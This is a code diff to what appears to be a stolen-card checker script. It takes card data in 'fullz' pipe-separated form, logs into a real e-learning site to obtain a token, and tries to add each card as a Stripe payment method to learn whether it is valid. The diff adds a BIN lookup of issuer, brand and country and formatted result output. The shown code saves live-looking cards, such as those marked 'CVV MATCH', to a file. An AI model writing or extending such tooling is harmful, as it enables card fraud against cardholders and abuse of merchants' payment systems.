@@ -53,7 +53,6 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         if expiry_year == current_year and expiry_month < current_month:
             return json.dumps({"error": {"message": "Expiration Month Invalid"}})
 
-        # Request headers etc.
         headers1 = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.9',
@@ -71,13 +70,11 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             'sec-ch-ua-platform': '"Linux"',
         }
 
-        # Get login token
         response = await session.get('https://elearntsg.com/login/', headers=headers1)
         login_token = gets(response.text, '"learndash-login-form" value="', '" />')
         if not login_token:
             return json.dumps({"error": {"message": "Failed to get login token"}})
 
-        # Login data
         headers2 = headers1.copy()
         headers2.update({
             'Content-Type': 'application/x-www-form-urlencoded',
@@ -182,6 +179,26 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
 
     except Exception as e:
         return f"Exception: {str(e)}"
+
+# Function to get bin info from binlist.net
+async def get_bin_info(bin_number: str) -> dict:
+    url = f"https://lookup.binlist.net/{bin_number}"
+    headers = {"Accept-Version": "3"}
+    try:
+        async with httpx.AsyncClient(timeout=10) as client:
+            resp = await client.get(url, headers=headers)
+            if resp.status_code == 200:
+                data = resp.json()
+                return {
+                    "type": data.get("type", "N/A"),
+                    "brand": data.get("brand", "N/A"),
+                    "issuer": data.get("bank", {}).get("name", "N/A"),
+                    "country": data.get("country", {}).get("name", "N/A"),
+                }
+            else:
+                return {"type": "N/A", "brand": "N/A", "issuer": "N/A", "country": "N/A"}
+    except Exception:
+        return {"type": "N/A", "brand": "N/A", "issuer": "N/A", "country": "N/A"}
 
 # Function maps API response text to friendly message
 async def charge_resp(result):
@@ -296,7 +313,7 @@ async def charge_resp(result):
     except Exception as e:
         return f"{str(e)} ❌"
 
-# Combines create_payment_method + charge_resp + measure time
+# Combines create_payment_method + charge_resp + measure time + binlist info
 async def multi_checking(fullz: str) -> str:
     start = time.time()
     async with httpx.AsyncClient(timeout=40) as session:
@@ -304,6 +321,10 @@ async def multi_checking(fullz: str) -> str:
         response = await charge_resp(result)
 
     elapsed = round(time.time() - start, 2)
+
+    # Ambil bin (6 digit pertama)
+    bin_number = fullz.split("|")[0][:6]
+    bin_info = await get_bin_info(bin_number)
 
     error_message = ""
     try:
@@ -313,19 +334,28 @@ async def multi_checking(fullz: str) -> str:
     except Exception:
         pass
 
+    bin_text = (
+        f"𝗧𝗬𝗣𝗘: » {bin_info['type']}\n"
+        f"𝗕𝗥𝗔𝗡𝗗: » {bin_info['brand']}\n"
+        f"𝗜𝗦𝗦𝗨𝗘𝗥: » {bin_info['issuer']}\n"
+        f"𝗖𝗢𝗨𝗡𝗧𝗥𝗬: » {bin_info['country']}\n"
+    )
+
     if error_message:
         output = (
             f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
             f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
             f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {error_message} ❌\n"
-            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
+            f"𝗧𝗶𝗺𝗲: » {elapsed}s\n"
+            f"{bin_text}"
         )
     else:
         output = (
             f"𝗖𝗮𝗿𝗱: » <code>{fullz}</code>\n"
             f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
             f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
-            f"𝗧𝗶𝗺𝗲: » {elapsed}s"
+            f"𝗧𝗶𝗺𝗲: » {elapsed}s\n"
+            f"{bin_text}"
         )
         if any(key in response for key in ["Payment method successfully added", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
             with open("auth.txt", "a", encoding="utf-8") as file:
